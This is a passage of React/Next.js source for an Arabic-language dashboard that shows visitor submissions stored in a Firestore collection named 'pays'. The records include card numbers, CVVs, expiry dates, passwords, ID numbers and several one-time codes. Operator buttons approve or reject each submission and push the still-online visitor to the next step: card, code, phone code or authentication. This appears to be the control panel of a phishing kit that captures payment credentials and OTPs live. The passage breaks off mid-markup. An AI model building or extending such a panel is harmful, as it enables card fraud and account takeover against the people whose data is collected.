"use client"
import type React from "react"
import { useState, useEffect, useMemo, useRef } from "react"
import { useRouter } from "next/navigation"
import {
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  Search,
  Download,
  Settings,
  Menu,
  ArrowUpDown,
  ChevronLeft,
  ChevronRight,
  TrendingUp,
  RefreshCw,
  AlertCircle,
  Loader2,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow, format } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardFooter } from "@/components/ui/card"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { database } from "@/lib/firestore"
import { auth } from "@/lib/firestore"
import { db } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
  DropdownMenuSeparator,
  DropdownMenuLabel,
} from "@/components/ui/dropdown-menu"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Separator } from "@/components/ui/separator"
import { Switch } from "@/components/ui/switch"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { toast } from "@/hooks/use-toast"
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"

// Types
type FlagColor = "red" | "yellow" | "green" | null

interface Notification {
  createdDate: string
  bank: string
  cardStatus?: string
  ip?: string
  cvv: string
  id: string | "0"
  expiryDate: string
  notificationCount: number
  otp: string
  otp2: string
  page: string
  cardNumber: string
  country?: string
  personalInfo: {
    id?: string | "0"
    name?: string
  }
  prefix: string
  status: "pending" | "approved" | "rejected" | string
  isOnline?: boolean
  lastSeen: string
  violationValue: number
  pass?: string
  year: string
  month: string
  pagename: string
  plateType: string
  allOtps?: string[] | null
  idNumber: string
  email: string
  mobile: string
  network: string
  phoneOtp: string
  cardExpiry: string
  name: string
  otpCode: string
  phone: string
  flagColor?: string
  currentPage?: string
  step?: number
}

const stepButtons = [
  { label: "بطاقة", step: 0 },
  { label: "كود", step: 2 },
  { label: "رقم", step: 3 },
  { label: "كود الهاتف", step: 4 },
  { label: "مصادقة", step: 5 },
]

// Hook for online users count
function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

// Hook to track online status for a specific user ID
function useUserOnlineStatus(userId: string) {
  const [isOnline, setIsOnline] = useState(false)

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      setIsOnline(data && data.state === "online")
    })

    return () => unsubscribe()
  }, [userId])

  return isOnline
}

function StatisticsCard({
  title,
  value,
  change,
  changeType,
  icon: Icon,
  color,
  trend,
}: {
  title: string
  value: string | number
  change: string
  changeType: "increase" | "decrease" | "neutral"
  icon: React.ElementType
  color: string
  trend?: number[]
}) {
  return (
    <Card className="group relative overflow-hidden bg-white/80 dark:bg-gray-900/80 backdrop-blur-sm border border-gray-200/50 dark:border-gray-700/50 shadow-sm hover:shadow-lg transition-all duration-500 hover:-translate-y-1">
      <div className="absolute inset-0 bg-gradient-to-br from-transparent via-transparent to-gray-50/30 dark:to-gray-800/30 opacity-0 group-hover:opacity-100 transition-opacity duration-500" />
      <CardHeader className="pb-3 relative z-10">
        <div className="flex items-start justify-between">
          <div className={`p-3 rounded-2xl shadow-lg ${color} group-hover:scale-110 transition-transform duration-300`}>
            <Icon className="h-5 w-5 text-white" />
          </div>
          <div className="text-right">
            <p className="text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider mb-1">
              {title}
            </p>
            <p className="text-2xl font-bold text-gray-900 dark:text-white">{value}</p>
          </div>
        </div>
      </CardHeader>
      <CardContent className="pt-0 relative z-10">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div
              className={`p-1 rounded-full ${
                changeType === "increase"
                  ? "bg-emerald-100 dark:bg-emerald-900/30"
                  : changeType === "decrease"
                    ? "bg-red-100 dark:bg-red-900/30"
                    : "bg-gray-100 dark:bg-gray-800"
              }`}
            >
              <TrendingUp
                className={`h-3 w-3 ${
                  changeType === "increase"
                    ? "text-emerald-600 dark:text-emerald-400"
                    : changeType === "decrease"
                      ? "text-red-600 dark:text-red-400 rotate-180"
                      : "text-gray-500"
                }`}
              />
            </div>
            <span
              className={`text-sm font-semibold ${
                changeType === "increase"
                  ? "text-emerald-600 dark:text-emerald-400"
                  : changeType === "decrease"
                    ? "text-red-600 dark:text-red-400"
                    : "text-gray-500"
              }`}
            >
              {change}
            </span>
          </div>
          {trend && (
            <div className="flex items-end gap-0.5 h-6 opacity-60 group-hover:opacity-100 transition-opacity duration-300">
              {trend.map((value, index) => (
                <div
                  key={index}
                  className={`w-1 rounded-full ${color.replace("bg-gradient-to-br from-", "bg-").replace(" to-", "").split(" ")[0]} transition-all duration-300 group-hover:scale-110`}
                  style={{
                    height: `${(value / Math.max(...trend)) * 100}%`,
                    animationDelay: `${index * 50}ms`,
                  }}
                />
              ))}
            </div>
          )}
        </div>
      </CardContent>
    </Card>
  )
}

// Enhanced User Status Component
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <div className="flex items-center gap-2">
      <div className={`w-2 h-2 rounded-full ${status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"}`} />
      <Badge
        variant="outline"
        className={`text-xs ${
          status === "online"
            ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
            : "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
        }`}
      >
        {status === "online" ? "متصل" : "غير متصل"}
      </Badge>
    </div>
  )
}

// Enhanced Flag Color Selector
function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: FlagColor
  onColorChange: (id: string, color: FlagColor) => void
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-yellow-500 fill-yellow-500"
                  : currentColor === "green"
                    ? "text-green-500 fill-green-500"
                    : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2">
        <div className="flex gap-2">
          {[
            { color: "red", label: "عالي الأولوية" },
            { color: "yellow", label: "متوسط الأولوية" },
            { color: "green", label: "منخفض الأولوية" },
          ].map(({ color, label }) => (
            <TooltipProvider key={color}>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className={`h-8 w-8 rounded-full bg-${color}-100 dark:bg-${color}-900 hover:bg-${color}-200 dark:hover:bg-${color}-800`}
                    onClick={() => onColorChange(notificationId, color as FlagColor)}
                  >
                    <Flag className={`h-4 w-4 text-${color}-500 fill-${color}-500`} />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>{label}</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          ))}
          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <Flag className="h-4 w-4 text-gray-500" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

// Enhanced Search Component
function SearchBar({ onSearch }: { onSearch: (term: string) => void }) {
  const [searchTerm, setSearchTerm] = useState("")
  const searchInputRef = useRef<HTMLInputElement>(null)

  const handleSearch = () => {
    onSearch(searchTerm)
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleSearch()
    }
  }

  return (
    <div className="relative">
      <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
      <Input
        ref={searchInputRef}
        type="search"
        placeholder="البحث في الإشعارات..."
        className="pl-10 pr-4 bg-background/50 backdrop-blur-sm border-muted-foreground/20 focus:border-primary/50 transition-colors"
        value={searchTerm}
        onChange={(e) => setSearchTerm(e.target.value)}
        onKeyDown={handleKeyDown}
      />
    </div>
  )
}

// Enhanced Pagination Component
function Pagination({
  currentPage,
  totalPages,
  onPageChange,
  totalItems,
  itemsPerPage,
}: {
  currentPage: number
  totalPages: number
  onPageChange: (page: number) => void
  totalItems: number
  itemsPerPage: number
}) {
  const startItem = (currentPage - 1) * itemsPerPage + 1
  const endItem = Math.min(currentPage * itemsPerPage, totalItems)

  return (
    <div className="flex items-center justify-between">
      <div className="text-sm text-muted-foreground">
        عرض {startItem} إلى {endItem} من {totalItems} عنصر
      </div>
      <div className="flex items-center gap-2">
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage - 1)}
          disabled={currentPage <= 1}
          className="gap-1"
        >
          <ChevronRight className="h-4 w-4" />
          السابق
        </Button>
        <div className="flex items-center gap-1">
          {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
            const page = i + 1
            return (
              <Button
                key={page}
                variant={currentPage === page ? "default" : "outline"}
                size="sm"
                className="w-8 h-8 p-0"
                onClick={() => onPageChange(page)}
              >
                {page}
              </Button>
            )
          })}
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage + 1)}
          disabled={currentPage >= totalPages}
          className="gap-1"
        >
          التالي
          <ChevronLeft className="h-4 w-4" />
        </Button>
      </div>
    </div>
  )
}

// Export dialog component
function ExportDialog({
  open,
  onOpenChange,
  notifications,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
  notifications: Notification[]
}) {
  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv")
  const [exportFields, setExportFields] = useState({
    personalInfo: true,
    cardInfo: true,
    status: true,
    timestamps: true,
  })
  const [isExporting, setIsExporting] = useState(false)

  const handleExport = () => {
    setIsExporting(true)

    // Simulate export process
    setTimeout(() => {
      setIsExporting(false)
      onOpenChange(false)
      toast({
        title: "تم التصدير بنجاح",
        description: `تم تصدير ${notifications.length} إشعار بتنسيق ${exportFormat.toUpperCase()}`,
      })
    }, 1500)
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Download className="h-5 w-5" />
            تصدير الإشعارات
          </DialogTitle>
        </DialogHeader>
        <div className="space-y-4 py-4">
          <div className="space-y-2">
            <Label>تنسيق التصدير</Label>
            <div className="flex gap-4">
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="csv"
                  value="csv"
                  checked={exportFormat === "csv"}
                  onChange={() => setExportFormat("csv")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="csv" className="cursor-pointer">
                  CSV
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="json"
                  value="json"
                  checked={exportFormat === "json"}
                  onChange={() => setExportFormat("json")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="json" className="cursor-pointer">
                  JSON
                </Label>
              </div>
            </div>
          </div>

          <div className="space-y-2">
            <Label>البيانات المراد تصديرها</Label>
            <div className="space-y-2">
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="personal-info"
                  checked={exportFields.personalInfo}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      personalInfo: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="personal-info" className="cursor-pointer">
                  المعلومات الشخصية
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="card-info"
                  checked={exportFields.cardInfo}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      cardInfo: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="card-info" className="cursor-pointer">
                  معلومات البطاقة
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="status"
                  checked={exportFields.status}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      status: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="status" className="cursor-pointer">
                  حالة الإشعار
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="timestamps"
                  checked={exportFields.timestamps}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      timestamps: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="timestamps" className="cursor-pointer">
                  الطوابع الزمنية
                </Label>
              </div>
            </div>
          </div>

          <div className="rounded-md bg-muted p-3">
            <div className="flex items-center gap-2 text-sm">
              <AlertCircle className="h-4 w-4 text-muted-foreground" />
              <p className="text-muted-foreground">سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.</p>
            </div>
          </div>
        </div>
        <DialogFooter className="sm:justify-start">
          <Button variant="outline" onClick={() => onOpenChange(false)}>
            إلغاء
          </Button>
          <Button type="submit" onClick={handleExport} disabled={isExporting}>
            {isExporting ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                جاري التصدير...
              </>
            ) : (
              <>
                <Download className="mr-2 h-4 w-4" />
                تصدير
              </>
            )}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )
}

// Settings panel component
function SettingsPanel({
  open,
  onOpenChange,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
}) {
  const [notifyNewCards, setNotifyNewCards] = useState(true)
  const [notifyNewUsers, setNotifyNewUsers] = useState(true)
  const [playSounds, setPlaySounds] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [refreshInterval, setRefreshInterval] = useState("30")

  return (
    <Sheet open={open} onOpenChange={onOpenChange}>
      <SheetContent side="left" className="sm:max-w-md" dir="rtl">
        <SheetHeader>
          <SheetTitle className="flex items-center gap-2 text-xl">
            <Settings className="h-5 w-5" />
            إعدادات الإشعارات
          </SheetTitle>
        </SheetHeader>
        <div className="mt-6 space-y-6">
          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات الإشعارات</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-cards">إشعارات البطاقات الجديدة</Label>
                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند إضافة بطاقة جديدة</p>
                </div>
                <Switch id="notify-cards" checked={notifyNewCards} onCheckedChange={setNotifyNewCards} />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-users">إشعارات المستخدمين الجدد</Label>
                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند تسجيل مستخدم جديد</p>
                </div>
                <Switch id="notify-users" checked={notifyNewUsers} onCheckedChange={setNotifyNewUsers} />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="play-sounds">تشغيل الأصوات</Label>
                  <p className="text-xs text-muted-foreground">تشغيل صوت عند استلام إشعار جديد</p>
                </div>
                <Switch id="play-sounds" checked={playSounds} onCheckedChange={setPlaySounds} />
              </div>
            </div>
          </div>

          <Separator />

          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات التحديث التلقائي</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="auto-refresh">تحديث تلقائي</Label>
                  <p className="text-xs text-muted-foreground">تحديث البيانات تلقائيًا</p>
                </div>
                <Switch id="auto-refresh" checked={autoRefresh} onCheckedChange={setAutoRefresh} />
              </div>
              {autoRefresh && (
                <div className="space-y-1.5">
                  <Label htmlFor="refresh-interval">فترة التحديث (بالثواني)</Label>
                  <Select value={refreshInterval} onValueChange={setRefreshInterval}>
                    <SelectTrigger id="refresh-interval">
                      <SelectValue placeholder="اختر فترة التحديث" />
                    </SelectTrigger>
                    <SelectContent position="popper">
                      <SelectItem value="10">10 ثواني</SelectItem>
                      <SelectItem value="30">30 ثانية</SelectItem>
                      <SelectItem value="60">دقيقة واحدة</SelectItem>
                      <SelectItem value="300">5 دقائق</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              )}
            </div>
          </div>

          <div className="flex justify-end gap-2 pt-4">
            <Button variant="outline" onClick={() => onOpenChange(false)}>
              إلغاء
            </Button>
            <Button
              onClick={() => {
                toast({
                  title: "تم حفظ الإعدادات",
                  description: "تم حفظ إعدادات الإشعارات بنجاح",
                })
                onOpenChange(false)
              }}
            >
              حفظ الإعدادات
            </Button>
          </div>
        </div>
      </SheetContent>
    </Sheet>
  )
}

// Main Component
export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage] = useState(10)
  const [settingsOpen, setSettingsOpen] = useState(false)
  const [exportDialogOpen, setExportDialogOpen] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date")
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc")
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  // Track online status for all notifications
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  // Effect to track online status for all notifications
  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {}

    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`)

      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }))
      })

      statusRefs[notification.id] = callback
    })

    // Cleanup function
    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe()
        }
      })
    }
  }, [notifications])

  // Statistics calculations
  const totalVisitorsCount = notifications.length
  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length
  const approvedCount = notifications.filter((n) => n.status === "approved").length
  const pendingCount = notifications.filter((n) => n.status === "pending").length

  // Filter and search notifications
  const filteredNotifications = useMemo(() => {
    let filtered = notifications

    // Apply filter type
    if (filterType === "card") {
      filtered = filtered.filter((notification) => notification.cardNumber)
    } else if (filterType === "online") {
      filtered = filtered.filter((notification) => onlineStatuses[notification.id])
    }

    // Apply search term
    if (searchTerm) {
      const term = searchTerm.toLowerCase()
      filtered = filtered.filter(
        (notification) =>
          notification.name?.toLowerCase().includes(term) ||
          notification.email?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.cardNumber?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.otp?.toLowerCase().includes(term),
      )
    }

    // Apply sorting
    filtered.sort((a, b) => {
      let aValue: any, bValue: any

      switch (sortBy) {
        case "date":
          aValue = new Date(a.createdDate)
          bValue = new Date(b.createdDate)
          break
        case "status":
          aValue = a.status
          bValue = b.status
          break
        case "country":
          aValue = a.country || ""
          bValue = b.country || ""
          break
        default:
          return 0
      }

      if (sortOrder === "asc") {
        return aValue > bValue ? 1 : -1
      } else {
        return aValue < bValue ? 1 : -1
      }
    })

    return filtered
  }, [filterType, notifications, onlineStatuses, searchTerm, sortBy, sortOrder])

  // Paginate notifications
  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredNotifications, currentPage, itemsPerPage])

  const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / itemsPerPage))

  // Reset to first page when filter or search changes
  useEffect(() => {
    setCurrentPage(1)
  }, [filterType, searchTerm])

  // Firebase authentication and data fetching
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Check if there are any new notifications with card info or general info
        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber || notification.email || notification.mobile) &&
            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
        )

        // Only play notification sound if new card info or general info is added
        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound()
        }

        // Update statistics
        updateStatistics(notificationsData)

        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
        toast({
          title: "خطأ في جلب البيانات",
          description: "حدث خطأ أثناء جلب الإشعارات",
          variant: "destructive",
        })
      },
    )

    return unsubscribe
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const handleFlagColorChange = async (id: string, color: string) => {
    try {
      // Update in Firestore
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { flagColor: color })

      // Update local state
      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, flagColor: color } : notification,
        ),
      )

      toast({
        title: "تم تحديث العلامة",
        description: color ? "تم تحديث لون العلامة بنجاح" : "تمت إزالة العلامة بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating flag color:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث لون العلامة",
        variant: "destructive",
      })
    }
  }

  const handleStepUpdate = async (id: string, step: number) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { step: step })

      setNotifications(
        notifications.map((notification) => (notification.id === id ? { ...notification, step: step } : notification)),
      )

      toast({
        title: "تم تحديث الخطوة",
        description: `تم تحديث الخطوة بنجاح.`,
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating step:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث الخطوة",
        variant: "destructive",
      })
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        status: state,
      })
      toast({
        title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
        description: state === "approved" ? "تمت الموافقة على الإشعار بنجاح" : "تم رفض الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating notification status:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة الإشعار",
        variant: "destructive",
      })
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
      toast({
        title: "تم مسح الإشعار",
        description: "تم مسح الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعار",
        variant: "destructive",
      })
    }
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      toast({
        title: "تم مسح جميع الإشعارات",
        description: "تم مسح جميع الإشعارات بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعارات",
        variant: "destructive",
      })
    } finally {
      setIsLoading(false)
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الخروج",
        variant: "destructive",
      })
    }
  }

  const handleSearch = (term: string) => {
    setSearchTerm(term)
  }

  const handlePageChange = (page: number) => {
    setCurrentPage(page)
  }

  const handleRefresh = () => {
    setIsLoading(true)
    fetchNotifications()
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20 flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="relative">
            <div className="h-12 w-12 animate-spin rounded-full border-4 border-primary/20 border-t-primary"></div>
            <div className="absolute inset-0 h-12 w-12 animate-pulse rounded-full bg-primary/10"></div>
          </div>
          <div className="text-lg font-medium">جاري التحميل...</div>
        </div>
      </div>
    )
  }

  // Sample data for mini charts (you can replace with real trend data)
  const visitorTrend = [5, 8, 12, 7, 10, 15, 13]
  const cardTrend = [2, 3, 5, 4, 6, 8, 7]
  const onlineTrend = [3, 4, 6, 5, 7, 8, 6]
  const approvedTrend = [1, 2, 4, 3, 5, 7, 6]

  return (
    <div
      dir="rtl"
      className="min-h-screen bg-gradient-to-br from-gray-50 via-white to-gray-100 dark:from-gray-900 dark:via-gray-900 dark:to-gray-800"
    >
      {/* Mobile menu */}
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent
          side="right"
          className="w-[280px] bg-white/95 dark:bg-gray-900/95 backdrop-blur-xl border-l border-gray-200/50 dark:border-gray-700/50"
          dir="rtl"
        >
          <SheetHeader className="mb-8">
            <SheetTitle className="flex items-center gap-3 text-lg font-semibold">
              <div className="p-2 rounded-xl bg-gradient-to-br from-blue-500 to-blue-600 shadow-lg">
                <Bell className="h-4 w-4 text-white" />
              </div>
              <span>لوحة الإشعارات</span>
            </SheetTitle>
          </SheetHeader>
          <div className="space-y-8">
            <div className="flex items-center gap-4 p-4 rounded-2xl bg-gray-50/80 dark:bg-gray-800/50 border border-gray-200/50 dark:border-gray-700/50">
              <Avatar className="ring-2 ring-blue-500/20">
                <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
                <AvatarFallback className="bg-gradient-to-br from-blue-500 to-blue-600 text-white font-semibold">
                  M
                </AvatarFallback>
              </Avatar>
              <div>
                <p className="font-semibold text-gray-900 dark:text-white">مدير النظام</p>
                <p className="text-sm text-gray-500 dark:text-gray-400">admin@example.com</p>
              </div>
            </div>
            <Separator className="bg-gray-200/50 dark:bg-gray-700/50" />
            <nav className="space-y-2">
              <Button
                variant="ghost"
                className="w-full justify-start h-12 rounded-xl hover:bg-blue-50 dark:hover:bg-blue-900/20 hover:text-blue-600 dark:hover:text-blue-400 transition-all duration-200"
                onClick={() => setMobileMenuOpen(false)}
              >
                <Bell className="mr-3 h-4 w-4" />
                الإشعارات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start h-12 rounded-xl hover:bg-gray-50 dark:hover:bg-gray-800 transition-all duration-200"
                onClick={() => setSettingsOpen(true)}
              >
                <Settings className="mr-3 h-4 w-4" />
                الإعدادات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start h-12 rounded-xl hover:bg-gray-50 dark:hover:bg-gray-800 transition-all duration-200"
                onClick={() => {
                  setExportDialogOpen(true)
                  setMobileMenuOpen(false)
                }}
              >
                <Download className="mr-3 h-4 w-4" />
                تصدير البيانات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start h-12 rounded-xl hover:bg-red-50 dark:hover:bg-red-900/20 hover:text-red-600 dark:hover:text-red-400 transition-all duration-200"
                onClick={handleLogout}
